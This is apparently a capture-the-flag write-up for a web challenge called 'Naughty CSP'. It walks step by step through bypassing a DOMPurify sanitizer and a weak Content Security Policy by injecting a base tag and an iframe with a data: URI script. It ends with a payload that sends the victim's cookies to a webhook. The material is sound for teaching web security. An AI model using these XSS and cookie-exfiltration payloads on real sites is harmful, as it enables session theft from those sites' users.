#### Naughty CSP

The intended solution to this challenge is based on 3 observations :
- The initial username taken from the email on registration (limited to 40 characters) is unsafely inserted into the HTML template of the wishlist in the `title` element of the `head` portion of the document
- The CSP from the server's reponse allows `script` elements to be loaded from `data:` URIs and is missing the important `default-src: none` directive
- The wishlist content is sanitized with the most recent version of `DOMPurify`, which is loaded from the `parser.js` file. Sanitization only occurs if the `DOMPurify` object is available to the current browser tab (`window`)

The flag is stored as a cookie in a headless browser that a bot uses to visit the wishlist page of the user that sent the request. To obtain the flag, we need to trigger JavaScript code on the wishlist page that will access the document cookies and exfiltrate them somewhere. `DOMPurify` will sanitize all dangerous XSS payloads in the wishlist and the CSP will control how resources can be loaded onto the page, further restricting our options. 

#### Steps

First, register a username that will break out of the `title` tag and set the base URI of all relative links on the page to a non-existant URL, which stops the `parser.js` sanitizer file from executing. This username has to be shorter than 40 characters and still follow syntax similar to an email : 
```html
</title><base href=http://x.x>@x
```

This allows us to inject XSS payloads into the wishlist (we could inject them into our username as well, but the length restriction makes it hard to have a valid payload). 

Next, we'll need to get around the CSP to load valid JS onto the page. We can do this with the allowed `data:` URI like so :
```html
<script src=data:text/javascript,alert(XSS)></script>
```

The only problem is that the wishlist content is inserted into the `innerHTML` property of the `p` element, which doesn't allow `script` tags to be loaded and executed by browsers. To get around this, we can simply create an `iframe` that will contain our malicious `script` tag on the same origin :
```html
<iframe srcdoc='<script src=data:text/javascript,alert(XSS)></script>'></iframe>
```

We can load `iframes` because of the missing `default-src: none` CSP directive, which would disallow resources to be loaded unless specifically allowed. The presence of another directive like `frame-src` could have also prevented `iframes` to be loaded in the first place.

Since cookies are tied to origins, we can access and exfiltrate them to a webhook. The `connect-src: 'self'` directive from the CSP stops us from using JavaScript APIs to make external requests, but we can still cause a window redirect with the cookie in the URL for exfiltration :
```html
<iframe srcdoc='<script src=data:text/javascript,window.location=`{WEBHOOK}/flag?flag=`+document.cookie></script>'></iframe>
```
